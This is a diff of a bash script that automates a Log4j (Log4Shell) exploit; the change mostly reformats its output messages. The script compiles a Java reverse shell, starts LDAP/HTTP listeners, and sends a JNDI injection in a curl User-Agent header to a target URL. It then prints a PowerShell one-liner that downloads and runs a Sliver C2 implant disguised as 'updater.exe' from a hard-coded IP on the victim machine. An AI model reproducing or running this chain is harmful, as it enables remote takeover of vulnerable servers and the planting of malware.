@@ -6,51 +6,53 @@ reverse_shell="./ReverseShell" # Do not include file extention, e.g. '/home/user
 c2_payload_url='http://94.249.192.1:8000/updater.exe' # Location of where the Sliver malware is hosted
 log4rce="./log4rce.py" # Path to log4rce.py
 
-echo 'Executing in 10 seconds'
-echo 'Troubleshooting checklist:'
-echo '[] Did you update IP/Port in ReverseShell.java?'
-echo '[] Did you properly set all variables at the top of this script before execution?'
-echo '[] Did you start you netcat listener? (Same IP/Port as in the ReverseShell.java)'
-sleep 10
 
-echo '   [+] Compiling reverse shell payload ...'
+# 0. Reminders/Prep
+printf "\n\nPre-Flight checklist:\n"
+printf "[] Did you start you TCP reverse shell listener (e.g. netcat)?\n"
+printf "[] Did you update IP/Port in ReverseShell.java to match the reverse shell listener?\n"
+printf "[] Did you verify all variables at the top of $(basename "$0") script are properly set?\n"
+printf "\n\n"
+
+for i in {7..1}; do
+    echo -ne "Executing in: $i\r"
+    sleep 1
+done
+
+
+# 1. Compile reverse shell payload
+printf '   [+] Compiling reverse shell payload ...\n'
 javac -source 1.7 -target 1.7 $reverse_shell.java -Xlint:-options
-
-echo
-echo '   [+] Reverse shell compiled ...'
+printf "\n   [+] Reverse shell compiled ...\n"
 sleep 1
 
-echo
-echo '   [+] Starting LDAP server listener ...'
+
+# 2. Execute log4rce.py, which will start listeners to deliver java reverse shell paylaod
+printf "\n   [+] Starting LDAP server listener ...\n"
 python3 $log4rce --java_class $reverse_shell.class --ldap_rhost "$attacker_ip" --http_rhost "$attacker_ip" &
 py_pid=$! # Saving PID to kill processes later
 sleep 3
 
-echo
-echo '   [+] Triggering Log4j exploit ...'
+
+# 3. Send web request which triggers Log4j vulnerability in the User-Agent field
+printf "\n   [+] Triggering Log4j exploit ...\n"
 curl -A "\${jndi:ldap://$attacker_ip:1387/ReverseShell}" $vulnerable_url &
 curl_pid=$! # Saving PID to kill processes later
-sleep 3
+sleep 5
 
-echo
-echo
-echo '   [+] Log4j exploit sent, check for reverse shell.'
 
-echo '   [+] Attempting to kill associated scripts ...'
+# 4. Kill the python and curl processes to save resources
+printf "\n   [+] Attempting to kill associated scripts ...\n"
+printf "\n   [+] Killing (3) python processes ...\n"
 kill -9 $py_pid `expr $py_pid + 2` `expr $py_pid + 3`
 sleep 1
-
-echo
-echo '   [+] Be sure to cleanup manually if there were any errors during the cleanup above'
-sleel 1
-
-echo
-echo '   [+] Killing curl process ...'
+printf "\n   [+] Killing curl process ...\n"
 kill -9 $curl_pid
 sleep 1
+printf "\n   [+] Be sure to cleanup manually if there were any errors during the cleanup above\n"
 
-echo
-echo
-echo '   [+] Now transfer and execute the C2 implant with the below command on the victim host:'
-echo "powershell -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '$c2_payload_url' -OutFile '%appdata%\updater.exe'; %appdata%\updater.exe\""
-echo
+
+# 5. Move on the next pahse of attack
+printf "\n\n   [+] Log4j exploit sent, check for reverse shell.\n"
+printf "\n\n   [+] Now transfer and execute the C2 implant with the below command on the victim host:\n"
+printf "powershell -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '$c2_payload_url' -OutFile '%%appdata%%\\\updater.exe'; %%appdata%%\\\updater.exe\"\n\n"
